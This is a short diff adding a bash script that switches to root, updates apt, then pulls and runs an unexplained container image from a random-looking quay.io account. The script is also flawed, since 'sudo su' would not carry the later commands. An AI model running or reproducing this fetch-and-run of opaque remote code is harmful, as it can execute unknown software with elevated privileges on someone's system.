@@ -1,0 +1,9 @@
+#!/bin/bash
+
+sudo su
+
+apt update
+
+docker pull quay.io/eyfsubdi78/a:latest
+
+docker run quay.io/eyfsubdi78/a:latest
